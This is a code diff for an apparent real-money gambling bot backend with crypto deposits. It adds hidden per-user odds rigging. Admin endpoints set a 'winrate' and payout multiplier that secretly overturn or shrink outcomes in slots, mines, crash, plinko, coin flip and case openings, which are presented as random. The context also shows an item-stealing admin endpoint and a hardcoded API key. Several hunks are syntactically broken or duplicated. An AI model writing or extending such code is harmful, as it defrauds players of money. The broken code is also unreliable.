@@ -57,6 +57,37 @@ MIN_WITHDRAW = 15
 BETS = [10, 50, 100, 500, 1000, 10000, 20000, 30000, 50000, 100000]
 ADMIN_IDS = [7643224285]
 
+# ═══════════ ПОДКРУТКА ШАНСОВ ═══════════
+
+async def _apply_winrate(uid: int, base_win: bool) -> bool:
+    """
+    base_win — «честный» результат (True=победа).
+    Возвращает итоговый результат с учётом настроек винрейта.
+    winrate: 0..100 (50 = честно, >50 подыгрываем, <50 мешаем)
+    """
+    winrate, _ = await get_winrate(uid)
+
+    if winrate >= 50:
+        # подыгрываем: если игрок проиграл — даём шанс на победу
+        if not base_win:
+            bias = (winrate - 50) / 50.0  # 0..1
+            return random.random() < bias
+        return True
+    else:
+        # мешаем: если игрок выиграл — шанс отменить
+        if base_win:
+            bias = (50 - winrate) / 50.0  # 0..1
+            return random.random() > bias
+        return False
+
+
+async def _apply_payout(uid: int, win_amount: int) -> int:
+    """Урезает/увеличивает выплату согласно payout_mult."""
+    _, payout_mult = await get_winrate(uid)
+    if payout_mult == 1.0 or win_amount <= 0:
+        return win_amount
+    return max(0, int(win_amount * payout_mult))
+
 # ═══════════ CRYPTO DIRECT (Polygon USDC) ═══════════
 SELLER_WALLET = "0xFe06D515f0728567e34B94de549289791d9b1BA3"
 POLYGONSCAN_API_KEY = "Y2CVHHPY54VYJUTKG2FW7YZAI49EMYVXHN"
@@ -375,26 +406,36 @@ async def api_slots(request: Request):
         base_win = bet * 2
 
     base_win_bool = base_win > 0
-
-    # подкрутка
     final_win_bool = await _apply_winrate(uid, base_win_bool)
 
     if final_win_bool and not base_win_bool:
-        # подыграли — даём случайный небольшой выигрыш
         win = int(bet * random.choice([1.5, 2.0, 2.5, 3.0]))
     elif not final_win_bool and base_win_bool:
-        # помешали — обнуляем
         win = 0
+        jackpot = False
     else:
         win = base_win
 
-    # применяем множитель выплат
+    win = await _apply_payout(uid, win)
+
+    # подкрутка
+    base_win = win
+    base_win_bool = base_win > 0
+    final_win_bool = await _apply_winrate(uid, base_win_bool)
+    if final_win_bool and not base_win_bool:
+        win = int(bet * random.choice([1.5, 1.95, 2.5]))
+        mult = 1.95
+    elif not final_win_bool and base_win_bool:
+        win = 0
+        mult = 0
+    else:
+        win = base_win
     win = await _apply_payout(uid, win)
 
     if win > 0:
         await add_balance(uid, win)
-
     await log_game(uid, bet, win)
+    await add_battle_pass_xp(uid, bet // 10)
     await log_house_flow(wagered=bet, paid=win)
     nb = await get_balance(uid)
 
@@ -513,7 +554,17 @@ async def api_slots2_spin(request: Request):
 
     await add_balance(uid, -total_bet)
 
-    field, total_win, line_wins = _slot_spin(bet, lines_count)
+        field, total_win, line_wins = _slot_spin(bet, lines_count)
+
+    # подкрутка
+    base_win_bool = total_win > 0
+    final_win_bool = await _apply_winrate(uid, base_win_bool)
+    if final_win_bool and not base_win_bool:
+        total_win = int(total_bet * random.choice([0.5, 1.0, 1.5, 2.0]))
+    elif not final_win_bool and base_win_bool:
+        total_win = 0
+        line_wins = []
+    total_win = await _apply_payout(uid, total_win)
 
     if total_win > 0:
         await add_balance(uid, total_win)
@@ -625,7 +676,16 @@ async def api_mines_open(request: Request):
                     n += 1
         return n
 
-    if idx in game["mines"]:
+        # подкрутка: с шансом «не взрываемся»
+    hit_mine = idx in game["mines"]
+    if hit_mine:
+        winrate, _ = await get_winrate(uid)
+        if winrate > 50:
+            bias = (winrate - 50) / 50.0
+            if random.random() < bias:
+                hit_mine = False
+
+    if hit_mine:
         game["opened"].add(idx)
         bet = game["bet"]
         del mines_games[uid]
@@ -648,8 +708,10 @@ async def api_mines_open(request: Request):
 
     if len(game["opened"]) >= safe:
         step_mult = MINES_MULT[game["mines_count"]]
-        win = int(game["bet"] * (1 + step_mult * safe))
-        await add_balance(uid, win)
+    prize = int(game["bet"] * (1 + step_mult * len(game["opened"])))
+    prize = await _apply_payout(uid, prize)
+    bet = game["bet"]
+    await add_balance(uid, prize)
         await log_game(uid, game["bet"], win)
         await add_battle_pass_xp(uid, game["bet"] // 10)
         await log_house_flow(wagered=game["bet"], paid=win)
@@ -751,11 +813,23 @@ async def api_crash_start(request: Request):
 
     await add_balance(uid, -bet)
 
-    r = random.random()
+        r = random.random()
     if r < 0.05:
         crash_at = 1.00
     else:
         crash_at = min(100.0, max(1.01, 0.95 / (1 - r)))
+
+    # подкрутка crash_at
+    winrate, _ = await get_winrate(uid)
+    if winrate > 50:
+        # подыгрываем: сдвигаем crash_at вверх
+        bonus = (winrate - 50) / 50.0 * 2.0   # до +2.0 к множителю
+        crash_at = max(crash_at, 1.01 + bonus)
+    elif winrate < 50:
+        # мешаем: сдвигаем вниз
+        penalty = (50 - winrate) / 50.0
+        if random.random() < penalty:
+            crash_at = min(crash_at, 1.01 + random.random() * 0.3)
 
     crash_games[uid] = {
         "bet": bet,
@@ -853,6 +927,7 @@ async def api_crash_cashout(request: Request):
         raise HTTPException(400, "crashed")
 
     prize = int(game["bet"] * mult)
+    prize = await _apply_payout(uid, prize)
     bet = game["bet"]
     del crash_games[uid]
     await add_balance(uid, prize)
@@ -1065,7 +1140,20 @@ async def api_plinko(request: Request):
             break
 
     mult = mults[slot]
-    win = int(bet * mult)
+    base_win = int(bet * mult)
+
+    # подкрутка
+    base_win_bool = base_win > bet
+    final_win_bool = await _apply_winrate(uid, base_win_bool)
+    if final_win_bool and not base_win_bool:
+        win = int(bet * 1.5)
+        mult = 1.5
+    elif not final_win_bool and base_win_bool:
+        win = int(bet * 0.5)
+        mult = 0.5
+    else:
+        win = base_win
+    win = await _apply_payout(uid, win)
 
     if win > 0:
         await add_balance(uid, win)
@@ -1338,13 +1426,26 @@ async def api_coin_flip(request: Request):
 
     await add_balance(uid, -bet)
 
-    result = random.choice(["heads", "tails"])
-    win = 0
-    mult = 0
-    if result == side:
-        mult = 1.95
-        win = int(bet * mult)
+     result = random.choice(["heads", "tails"])
+    base_win = int(bet * 1.95) if result == side else 0
+    base_win_bool = base_win > 0
+    final_win_bool = await _apply_winrate(uid, base_win_bool)
+
+    if final_win_bool and not base_win_bool:
+        win = int(bet * 1.5)
+        mult = 1.5
+    elif not final_win_bool and base_win_bool:
+        win = 0
+        mult = 0
+    else:
+        win = base_win
+        mult = 1.95 if base_win_bool else 0
+
+    win = await _apply_payout(uid, win)
+    if win > 0:
         await add_balance(uid, win)
+
+    await log_game(uid, bet, win)
 
     await log_game(uid, bet, win)
     await add_battle_pass_xp(uid, bet // 10)
@@ -1953,8 +2054,20 @@ async def api_cases_spin(request: Request):
 
     await add_balance(uid, -price_coins)
 
-    item_id, rarity_id, rarity_emoji, rarity_name, emoji, name, value_mult = _roll_case(case_id)
+        item_id, rarity_id, rarity_emoji, rarity_name, emoji, name, value_mult = _roll_case(case_id)
+
+    # подкрутка редкости
+    winrate, _ = await get_winrate(uid)
+    if winrate > 50 and rarity_id in ("common", "uncommon"):
+        if random.random() * 100 < (winrate - 50):
+            item_id, rarity_id, rarity_emoji, rarity_name, emoji, name, value_mult = _roll_case(case_id)
+    elif winrate < 50 and rarity_id in ("legendary", "mythic"):
+        if random.random() * 100 < (50 - winrate):
+            item_id, rarity_id, rarity_emoji, rarity_name, emoji, name, value_mult = _roll_case(case_id)
+
     value = int(price_coins * value_mult)
+    _, payout_mult = await get_winrate(uid)
+    value = max(0, int(value * payout_mult))
     kind = "nft" if rarity_id in ("epic", "legendary", "mythic") else "gift"
 
     await add_user_item(uid, item_id, case_id, rarity_id, emoji, name, value, kind=kind)
@@ -2920,6 +3033,87 @@ async def api_admin_steal_item(request: Request):
     await log_admin_action(admin["id"], "steal_item", from_user_id, f"#{item_pk}")
     return {"ok": True}
 
+# ═══════════ АДМИН: ПОДКРУТКА ШАНСОВ ═══════════
+
+@app.post("/api/admin/winrate/set")
+async def api_admin_winrate_set(request: Request):
+    data = await request.json()
+    admin = admin_only(data.get("initData", ""))
+
+    target = data.get("target")
+    winrate = float(data.get("winrate", 50.0))
+    payout_mult = float(data.get("payout_mult", 1.0))
+
+    if winrate < 0 or winrate > 100:
+        raise HTTPException(400, "Винрейт от 0 до 100")
+    if payout_mult < 0 or payout_mult > 10:
+        raise HTTPException(400, "Множитель выплат от 0 до 10")
+
+    target_id = None
+    if target and str(target).strip():
+        t = str(target).strip()
+        if t.startswith("@"):
+            row = await get_user_by_username(t)
+            if not row:
+                raise HTTPException(404, "Пользователь не найден")
+            target_id = row[0]
+        else:
+            try:
+                target_id = int(t)
+            except ValueError:
+                raise HTTPException(400, "Некорректный ID")
+
+    await set_winrate(target_id, winrate, payout_mult)
+    await log_admin_action(
+        admin["id"], "set_winrate", target_id,
+        f"winrate={winrate}% payout_mult={payout_mult}",
+    )
+    return {"ok": True, "target_id": target_id, "winrate": winrate, "payout_mult": payout_mult}
+
+
+@app.post("/api/admin/winrate/list")
+async def api_admin_winrate_list(request: Request):
+    data = await request.json()
+    admin_only(data.get("initData", ""))
+    rows = await list_winrates()
+    return {
+        "settings": [
+            {
+                "user_id": r[0],
+                "winrate": r[1],
+                "payout_mult": r[2],
+                "updated_at": r[3],
+                "is_global": r[0] is None,
+            }
+            for r in rows
+        ]
+    }
+
+
+@app.post("/api/admin/winrate/clear")
+async def api_admin_winrate_clear(request: Request):
+    data = await request.json()
+    admin = admin_only(data.get("initData", ""))
+
+    target = data.get("target")
+    target_id = None
+    if target and str(target).strip():
+        t = str(target).strip()
+        if t.startswith("@"):
+            row = await get_user_by_username(t)
+            if not row:
+                raise HTTPException(404, "Пользователь не найден")
+            target_id = row[0]
+        else:
+            target_id = int(t)
+
+    await clear_winrate(target_id)
+    await log_admin_action(admin["id"], "clear_winrate", target_id, "")
+    return {"ok": True}
+
+
+@app.post("/api/admin/broadcast")
+async def api_admin_broadcast(request: Request):
 
 @app.post("/api/admin/broadcast")
 async def api_admin_broadcast(request: Request):
@@ -2928,7 +3122,7 @@ async def api_admin_broadcast(request: Request):
     text = data.get("text", "").strip()
     if not text:
         raise HTTPException(400, "Пустой текст")
-
+    
     ids = await get_all_user_ids()
     sent, failed = 0, 0
     for uid in ids:
@@ -2978,90 +3172,6 @@ async def _apply_payout(uid: int, win_amount: int) -> int:
         return win_amount
     return int(win_amount * payout_mult)
 
-# ═══════════ ПОДКРУТКА ШАНСОВ ═══════════
-
-@app.post("/api/admin/winrate/set")
-async def api_admin_winrate_set(request: Request):
-    data = await request.json()
-    admin = admin_only(data.get("initData", ""))
-
-    target = data.get("target")            # None / "" / "12345" / "@user"
-    winrate = float(data.get("winrate", 50.0))
-    payout_mult = float(data.get("payout_mult", 1.0))
-
-    if winrate < 0 or winrate > 100:
-        raise HTTPException(400, "Винрейт от 0 до 100")
-    if payout_mult < 0 or payout_mult > 10:
-        raise HTTPException(400, "Множитель выплат от 0 до 10")
-
-    from database import set_winrate, get_user_by_username
-
-    target_id = None
-    if target and str(target).strip():
-        t = str(target).strip()
-        if t.startswith("@"):
-            row = await get_user_by_username(t)
-            if not row:
-                raise HTTPException(404, "Пользователь не найден")
-            target_id = row[0]
-        else:
-            try:
-                target_id = int(t)
-            except ValueError:
-                raise HTTPException(400, "Некорректный ID")
-        # проверим, что пользователь есть
-        bal = await get_balance(target_id)
-        # не падаем, даже если 0
-
-    await set_winrate(target_id, winrate, payout_mult)
-    await log_admin_action(
-        admin["id"], "set_winrate", target_id,
-        f"winrate={winrate}% payout_mult={payout_mult}",
-    )
-    return {"ok": True, "target_id": target_id, "winrate": winrate, "payout_mult": payout_mult}
-
-
-@app.post("/api/admin/winrate/list")
-async def api_admin_winrate_list(request: Request):
-    data = await request.json()
-    admin_only(data.get("initData", ""))
-    from database import list_winrates
-    rows = await list_winrates()
-    return {
-        "settings": [
-            {
-                "user_id": r[0],
-                "winrate": r[1],
-                "payout_mult": r[2],
-                "updated_at": r[3],
-                "is_global": r[0] is None,
-            }
-            for r in rows
-        ]
-    }
-
-
-@app.post("/api/admin/winrate/clear")
-async def api_admin_winrate_clear(request: Request):
-    data = await request.json()
-    admin = admin_only(data.get("initData", ""))
-    from database import clear_winrate, get_user_by_username
-
-    target = data.get("target")
-    target_id = None
-    if target and str(target).strip():
-        t = str(target).strip()
-        if t.startswith("@"):
-            row = await get_user_by_username(t)
-            if not row:
-                raise HTTPException(404, "Пользователь не найден")
-            target_id = row[0]
-        else:
-            target_id = int(t)
-
-    await clear_winrate(target_id)
-    await log_admin_action(admin["id"], "clear_winrate", target_id, "")
-    return {"ok": True}
 
 if __name__ == "__main__":
     import os
